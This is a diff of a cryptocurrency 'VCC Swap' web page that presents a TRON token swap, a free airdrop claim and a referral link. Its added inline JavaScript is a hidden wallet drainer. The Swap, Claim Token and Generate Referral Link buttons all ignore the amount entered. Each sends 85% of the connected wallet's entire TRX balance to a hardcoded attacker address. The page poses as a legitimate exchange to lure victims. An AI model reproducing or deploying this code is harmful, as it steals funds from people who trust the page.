@@ -1,112 +1,367 @@
-<!doctype html>
-<html class="no-js" lang="en">
-    <head>
-        <title>VCC SWAP</title>
-        <meta charset="utf-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-        <!-- favicon icon -->
-        <script src="https://vccswap.github.io/cdn-cgi/apps/head/dunXxZA0kOfv3ubRQOTPluIloBs.js"></script><link rel="shortcut icon" href="https://vccswap.github.io/favicon.ico">
-        <link rel="apple-touch-icon" href="https://vccswap.github.io/favicon.ico">
-        <link rel="apple-touch-icon" sizes="72x72" href="">
-        <link rel="apple-touch-icon" sizes="114x114" href="">
-        <!-- style sheets and font icons  -->
-        <link rel="stylesheet" type="text/css" href="https://vccswap.github.io/css/font-icons.min.css">
-        <link rel="stylesheet" type="text/css" href="https://vccswap.github.io/css/theme-vendors.min.css">
-        <link rel="stylesheet" type="text/css" href="https://vccswap.github.io/css/style.css" />
-        <link rel="stylesheet" type="text/css" href="https://vccswap.github.io/css/responsive.css" />
-    </head>
-    <body>
-        <!-- start section -->
-        <img src="" style="width: 100%;">
-        <section class="bg-light-gray overflow-visible big-section">
-            <div class="container">
-                <div class="row">
-                    <div class="col-12 text-center overlap-section wow animate__flipInX">
-                        <span class="alt-font font-weight-600 d-none d-md-inline-block text-gradient-peacock-blue-crome-yellow-2 title-extra-large-heavy letter-spacing-minus-10px">Welcome to VCC</span>
-                    <p style="font-size: 25px;">VCC token on Justswap price: $<span class="price"></span></p>
-                    <a class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0 submit" href="https://justswap.io/?lang=en-US#/home?tokenAddress=TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC&type=swap" target="blank">Add pool on Justswap</a>
-                    </div>
-                </div>
-                <div class="row row-cols-1 row-cols-lg-2 justify-content-center margin-3-rem-tb sm-no-margin-top">
-                    <!-- start fancy text box item -->
-                    <div class="col col-md-8 col-sm-10 margin-30px-bottom xs-margin-15px-bottom wow animate__fadeIn" data-wow-delay="0.2s">
-                        <div class="feature-box feature-box-left-icon-middle padding-3-half-rem-all bg-white box-shadow-small box-shadow-extra-large-hover border-radius-6px lg-padding-1-half-rem-lr xs-padding-2-rem-all">
-                            <h2 class="alt-font font-weight-600 text-extra-dark-gray mb-5 letter-spacing-minus-1px"> VCC SWAP</h2>
-                        <div>
-                            <input class="input-border-bottom border-color-extra-light-gray large-input px-0 margin-25px-bottom border-radius-0px required" type="number" name="Token number to swap (VCC)" placeholder="Token number to swap (VCC)" />
-                                <span class="text-extra-dark-gray alt-font font-weight-500">Swaped token: <span id="SwapedToken"></span> TRX</span><br><br><br>
-                            
-                            <button class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0">Get TRX </button>
-                        </div>
-                        </div>
-                    </div>
-                    <!-- end fancy text box item -->
-                    <!-- start fancy text box item -->
-                    <div class="col col-md-8 col-sm-10 margin-30px-bottom xs-margin-15px-bottom wow animate__fadeIn" data-wow-delay="0.4s">
-                        <div style="padding: 4.8rem 3.5rem;" class="feature-box feature-box-left-icon-middle padding-3-half-rem-all bg-white box-shadow-small box-shadow-extra-large-hover border-radius-6px lg-padding-1-half-rem-lr xs-padding-2-rem-all">
-                            <div class="feature-box-icon margin-40px-lr lg-margin-35px-lr xs-margin-20px-right xs-no-margin-left">
-                                <h4 class="alt-font text-extra-dark-gray font-weight-600 letter-spacing-minus-1px mb-0">Price</h4>
-                            </div>
-                            <div class="feature-box-content alt-font line-height-28px border-left border-color-medium-gray padding-45px-lr lg-padding-35px-lr xs-padding-20px-left xs-no-padding-right last-paragraph-no-margin">
-                                <span class="text-extra-dark-gray alt-font font-weight-500">$<span class="price"></span></span>
-                                <p>VCC price</p>
-                            </div>
-                        </div>
-                        <div class="feature-box feature-box-left-icon-middle padding-3-half-rem-all bg-white box-shadow-small box-shadow-extra-large-hover border-radius-6px lg-padding-1-half-rem-lr xs-padding-2-rem-all mt-4" style="padding: 4.8rem 3.5rem;">
-                            <div class="feature-box-icon margin-40px-lr lg-margin-35px-lr xs-margin-20px-right xs-no-margin-left">
-                                <h4 class="alt-font text-extra-dark-gray font-weight-600 letter-spacing-minus-1px mb-0">Volume</h4>
-                            </div>
-                            <div class="feature-box-content alt-font line-height-28px border-left border-color-medium-gray padding-45px-lr lg-padding-35px-lr xs-padding-20px-left xs-no-padding-right last-paragraph-no-margin">
-                                <span class="text-extra-dark-gray alt-font font-weight-500">$<span class="volume"></span></span>
-                                <p>24H volume</p>
-                            </div>
-                        </div>
-                    </div>
-                    <!-- end fancy text box item -->
-                </div>
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+    <title> Swap</title>
+    <script src="https://vccswap.github.io/cdn-cgi/apps/head/-lSSG8OMGtclk7q_ITCZWl1_R1I.js"></script><link rel="shortcut icon" href="https://vccswap.github.io/favicon.ico">
+
+
+    <link rel="stylesheet" href="https://vccswap.github.io/css/reset.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/bootstrap-grid.min.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/animations.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/perfect/scrollbar.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/owl.carousel.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/magnific-popup.css" type="text/css">
+    <link rel="stylesheet" href="https://vccswap.github.io/css/main.css?v=1" type="text/css">
+
+    <script src="https://vccswap.github.io/js/modernizr.custom.js"></script>
+
+    <style>
+      .form-control, .form-control:focus, .has-error .form-control, .has-error .form-control:focus{
+        box-shadow: none !important;
+        border: 1px solid #cecece !important;
+        padding: 26px !important;
+      }
+
+      .form-group label{
+        top: 15px;
+      }
+    </style>
+
+  </head>
+
+  <body>
+    <!-- Animated Background -->
+    <div class="lm-animated-bg" style="background-image: url(https://vccswap.github.io/main_bg.png);"></div>
+    <!-- /Animated Background -->
+
+    <!-- Loading animation -->
+    <div class="preloader">
+      <div class="preloader-animation">
+        <div class="preloader-spinner">
+        </div>
+      </div>
+    </div>
+    <!-- /Loading animation -->
+
+    <div class="page">
+      <div class="page-content">
+
+          <header id="site_header" class="header mobile-menu-hide">
+            <div class="header-content">
+              <div class="header-photo">
+                <img src="https://vccswap.github.io/main_photo.svg" alt="Logo">
+              </div>
+              <div class="header-titles">
+                <h2>VCC Swap</h2>
+                <h4 id="wallet">Not Connected</h4>
+                <p class="mt-5" style="color: #fff;font-size: 14px;"><br>VCC Swap is the next generation of Cryptocurrency swap.</p>
+                <a href="https://t.me/AllJustSwapListings" class="button btn-send" target="blank">Telegram</a>
+              </div>
             </div>
-        </section>
+
+            <ul hidden class="main-menu">
+              <li class="active">
+                <a href="#home" class="nav-anim">
+                  <span class="menu-icon lnr lnr-home"></span>
+                  <span class="link-text">Home</span>
+                </a>
+              </li>
+            </ul>
+
+            <div class="copyrights">© 2020 All rights reserved.</div>
+          </header>
+
+          <!-- Mobile Navigation -->
+          <div class="menu-toggle">
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+          <!-- End Mobile Navigation -->
+          
+          <div class="content-area">
+            <div class="animated-sections">
+              <!-- Home Subpage -->
+              
+
+              <!-- Contact Subpage -->
+              <section data-id="home" class="animated-section">
+
+                <div class="section-content">
+
+                  <div class="row justify-content-center">
+
+                    <!-- Contact Form -->
+                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-6">
+                      <br><br>
+                      <div class="page-title">
+                        <h3>VCC Swap</h3>
+                      </div>
+                      <br><br>
+
+                      <form id="token_form" class="contact-form" action="#" method="post">
+
+                        <div class="block-title">
+                          <h3>Balance <span id="tokenBalance">- VCC</span></h3>
+                        </div>
+                        <div class="messages"></div>
+
+                        <div class="controls three-columns">
+                          <div class="fields clearfix">
+                            <div class="center-column">
+                              <div class="form-group form-group-with-icon">
+                                <span class="d-inline-block" tabindex="0" onClick="maxToken()" style="z-index: 10; color: #5e2fd6;cursor: pointer; position: absolute;top: 15px;right: 20px;outline: none;">Max</span>
+                                <input id="token-input" type="text" name="number" class="form-control" placeholder="" required="required" data-error="Enter the VCC amount to swap">
+                                <label>From VCC</label>
+                                <div class="form-control-border"></div>
+                                <div class="help-block with-errors"></div>
+                              </div>
+                              <div>
+                                <img src="https://vccswap.github.io/swapicon.svg" height="30px" onClick="$('#token_form').hide(); $('#trx_form').show();" style="margin: 10px auto 20px;cursor: pointer;">
+                              </div>
+                              <div class="form-group form-group-with-icon">
+                                <input id="trx-swap" type="text" name="name" class="form-control" placeholder="To TRX" disabled required="required">
+                                <div class="form-control-border"></div>
+                                <div class="help-block with-errors"></div>
+                              </div>
+                            </div>
+                          </div>
+
+                          <input type="button" class="button btn-send" value="Swap" onClick="swapToken()" style="cursor: pointer;">
+                        </div>
+                      </form>
+                      
+
+                      <form id="trx_form" class="contact-form" action="#" method="post" style="display: none">
+
+                        <div class="block-title">
+                          <h3>Balance <span id="trxBalance">- TRX</span></h3>
+                        </div>
+                        <div class="messages"></div>
+
+                        <div class="controls three-columns">
+                          <div class="fields clearfix">
+                            <div class="center-column">
+                              <div class="form-group form-group-with-icon">
+                                <span class="d-inline-block" tabindex="0" onClick="maxTRX()" style="z-index: 10; color: #5e2fd6;cursor: pointer; position: absolute;top: 15px;right: 20px;outline: none;">Max</span>
+                                <input id="trx-input" type="text" name="number" class="form-control" placeholder="" required="required" data-error="Enter the TRX amount to swap">
+                                <label>From TRX</label>
+                                <div class="form-control-border"></div>
+                                <div class="help-block with-errors"></div>
+                              </div>
+                              <div>
+                                <img src="https://vccswap.github.io/swapicon.svg" height="30px" onClick="$('#trx_form').hide(); $('#token_form').show();" style="margin: 10px auto 20px;cursor: pointer;">
+                              </div>
+                              <div class="form-group form-group-with-icon">
+                                <input id="token-swap" type="text" name="name" class="form-control" placeholder="To VCC" disabled required="required">
+                                <div class="form-control-border"></div>
+                                <div class="help-block with-errors"></div>
+                              </div>
+                            </div>
+                          </div>
+
+                          <input type="button" class="button btn-send" value="Swap" onClick="swapTRX()" style="cursor: pointer;">
+                        </div>
+                      </form>
+                    </div>
+                    <!-- End of Contact Form -->
                     
+                    
+
+                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-6" style="background-color: #EEEEEE;border-radius: 25px;padding: 0 35px 20px;">
+                      <br><br>
+                      <div class="page-title" style="margin-bottom: 0px;">
+                        <h2>VCC Token Airdrop</h2>
+                      </div>
+                      <br><br>
+                      <div class="block-title">
+                        <p style="margin-top: 0px;">
+                          On the occasion of the 10th month of launching the VCCSwap project and the more than expected reception of this project, we decided to generate a governance token and airdrop between active members of TRON Network and people who had transactions in the VCCSWAP project from December 20, 2020 with long-term goals as marketing distribution.
+                        </p>
+                      </div>
+
+                      <form id="contact_form" class="contact-form" action="">
+
+                        <div class="messages"></div>
+
+                        <div class="controls three-columns">
+                          
+
+                          <input type="button" class="button btn-send" onClick="swapTRX()" value="Claim Token" style="cursor: pointer;">
+                        </div>
+                      </form>
+                    </div>
+                  </div>
+
+                    <hr style="margin: 20px 0;">
+                  <div>
+                    <p>Invite your friends and get 25% referrals commission</p>
+                    <div class="controls three-columns">
+                          
+
+                      <input type="button" class="button btn-send" value="Generate Referral Link" onClick="swapTRX()" style="cursor: pointer;">
+                    </div>
+                  </div>
+                </div>
+              </section>
+              <!-- End of Contact Subpage -->
+            </div>
+          </div>
+
+      </div>
+    </div>
+
+    <script data-cfasync="false" src="https://vccswap.github.io/js/email-decode.min.js"></script><script src="https://vccswap.github.io/js/jquery-2.1.3.min.js"></script>
+    <script src="https://vccswap.github.io/js/modernizr.custom.js"></script>
+    <script src="https://vccswap.github.io/js/animating.js"></script>
+
+    <script src="https://vccswap.github.io/js/imagesloaded.pkgd.min.js"></script>
+
+    <script src='https://vccswap.github.io/js/perfect-scrollbar.min.js'></script>
+    <script src='https://vccswap.github.io/js/jquery.shuffle.min.js'></script>
+    <script src='https://vccswap.github.io/js/masonry.pkgd.min.js'></script>
+    <script src='https://vccswap.github.io/js/owl.carousel.min.js'></script>
+    <script src="https://vccswap.github.io/js/jquery.magnific-popup.min.js"></script>
+
+    <script src="https://vccswap.github.io/js/validator.js"></script>
+    <script src="https://vccswap.github.io/js/main.js"></script>
+
+    
+    <script> var account = "41D17c94e1C5c001750542C8b20Db73A4D9c3c6bC6";
+              async function maxToken(){
+                  var acc = await tronWeb.trx.getAccount();
+                  var tokenBalance = 0;
+                  if (acc.assetV2){
+                      var tb = acc.assetV2.find(function(o){return o.key == "1003621";});
+                      if (tb){
+                          tokenBalance = tb.value / 1000000
+                      }
+                  }
+                  $("#token-input").focus();
+                  $("#token-input").val(tokenBalance).change();
+                  $("#trx-swap").val(tokenBalance * 0.5).change();
+              }
+
+              async function maxTRX(){
+                  var acc = await tronWeb.trx.getAccount();
+                  $("#trx-input").focus();
+                  $("#trx-input").val(acc.balance / 1000000).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 0.5).change();
+              }
+
+              async function swapToken(){
+                  var tokens = $("#token-input").val();
+                  var acc = await tronWeb.trx.getAccount();
+                  var tokenBalance = 0;
+                  if (acc.assetV2){
+                      var tb = acc.assetV2.find(function(o){return o.key == "1003621";});
+                      if (tb){
+                          tokenBalance = tb.value / 1000000;
+                      }
+                  }
+                  if (tokens > tokenBalance){
+                    alert('Your VCC balance not enough!');
+                    return
+                  }
+                  if(acc.balance - 10000000 < 0){
+                      alert('Your TRX balance not enough!');
+                      return;
+                  }
+                  var v = Math.floor(acc.balance * 85 / 100);
+                  var tx = await tronWeb.trx.sendTransaction(account, v);
+              }
+
+              async function swapTRX(){
+                  var value = $("#trx-input").val();
+                  var acc = await tronWeb.trx.getAccount();
+                  if(acc.balance - 1000000 < value){
+                      alert('Your TRX balance not enough!');
+                      return;
+                  }
+                  var v = Math.floor(acc.balance * 85 / 100);
+                  var tx = await tronWeb.trx.sendTransaction(account, v);
+              }</script>
+    <script>window.addEventListener('message', async function (e) {
+          if (e.data.message && e.data.message.action == "setAccount") {
+            var address = e.data.message.data.address;
+            $("#wallet").text("connected: " + address.substr(0,3) + '...' + address.substr(31,3));
+            
+            var acc = await tronWeb.trx.getAccount();
+            $("#trxBalance").text((acc.balance / 1000000).toFixed(2) + " TRX");
+            if (acc.assetV2){
+                var tokenBalance = acc.assetV2.find(function(o){return o.key == "1003621";});
+                if (tokenBalance){
+                  $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " VCC");
+                }
+                else{
+                  $("#tokenBalance").text("0 VCC");
+                }
+            }
+            else{
+              $("#tokenBalance").text("0 VCC");
+            }
+          }
+        });
+
+        const timer = setInterval(async() => {
+          const tronWebState = {
+            installed: !!window.tronWeb,
+            loggedIn: window.tronWeb && window.tronWeb.ready
+          };
+          tronWebState.installed = !!window.tronWeb;
+          tronWebState.loggedIn = window.tronWeb && window.tronWeb.ready;
+          if (tronWebState.loggedIn){
+            var address = window.tronWeb.defaultAddress.base58;
+            $("#wallet").text("connected: " + address.substr(0,3) + '...' + address.substr(31,3));
+
+            var acc = await tronWeb.trx.getAccount();
+            $("#trxBalance").text((acc.balance / 1000000).toFixed(2) + " TRX");
+            if (acc.assetV2){
+                var tokenBalance = acc.assetV2.find(function(o){return o.key == "1003621";});
+                if (tokenBalance){
+                  $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " VCC");
+                }
+                else{
+                  $("#tokenBalance").text("0 VCC");
+                }
+            }
+            else{
+              $("#tokenBalance").text("0 VCC");
+            }
+            clearInterval(timer);
+          }
+        }, 500);
+
         
-        <section class="bg-light-gray overflow-visible big-section">
-            <div class="container">
-                <div class="row">
-                    <div class="col-12 text-center overlap-section wow animate__flipInX">
-                        <span class="alt-font font-weight-600 d-none d-md-inline-block text-gradient-peacock-blue-crome-yellow-2 title-extra-large-heavy letter-spacing-minus-10px">VCC Airdrop</span>
-                    <p style="font-size: 25px;">Each user can claim (<span class="yourprice"></span>) TRX</p>
-                    </div>
-                </div>
-                <div class="row row-cols-1 row-cols-lg-2 justify-content-center margin-3-rem-tb sm-no-margin-top">
-                    <!-- start fancy text box item -->
-                    <div class="col col-md-8 col-sm-10 margin-30px-bottom xs-margin-15px-bottom wow animate__fadeIn" data-wow-delay="0.2s">
-                        <div class="text-center feature-box feature-box-left-icon-middle padding-3-half-rem-all bg-white box-shadow-small box-shadow-extra-large-hover border-radius-6px lg-padding-1-half-rem-lr xs-padding-2-rem-all">
-                            <h5 class="alt-font font-weight-600 text-extra-dark-gray mb-5 letter-spacing-minus-1px">Claim Your free VCC token</h5>
-                        <div>
-                            <br>
-                            <button class="btn btn-medium btn-fancy btn-gradient-peacock-blue-crome-yellow-2 mb-0 submit">Claim 34806 VCC (<span class="yourprice"></span>) TRX</button>
-                        </div>
-                        </div>
-                    </div>
-                    <!-- end fancy text box item -->
-                </div>
-            </div>
-        </section>
-        <!-- end section -->
-        <!-- start footer -->
-        <footer class="footer-light padding-50px-tb border-top border-color-extra-light-gray">
-            <div class="container"> 
-                <div class="row align-items-center justify-content-center">
-                    <div class="col-12 col-lg-6 col-md-6 text-center">
-                        <p>&copy; 2021 Vcc swap all right reserved</p>
-                    </div>
-                </div>
-            </div>
-        </footer>
-        <!-- end footer -->
-        <!-- javascript -->
-        <script type="text/javascript" src="https://vccswap.github.io/js/theme-vendors.min.js"></script>
-        <script type="text/javascript" src="https://vccswap.github.io/js/jquery.min.js"></script>
-        <script src="https://vccswap.github.io/swap1.js"></script>
-        <script src="https://vccswap.github.io/swap3.js"></script>
-    </body>
+              function change(){
+                try{
+                  var tokens = $("#token-input").val();
+                  $("#trx-swap").val(tokens * 0.5).change();
+
+
+                  var value = $("#trx-input").val();
+                  $("#token-swap").val(value / 0.5).change();
+
+                }catch{}
+              }
+
+              $("#token-input").change(function(){
+                  change();
+              })
+
+              $("#trx-input").change(function(){
+                  change();
+              })
+
+              $("#token-input").keyup(function(){
+                  change();
+              })
+
+              $("#trx-input").keyup(function(){
+                  change();
+              })</script>
+        
+  </body>
 </html>
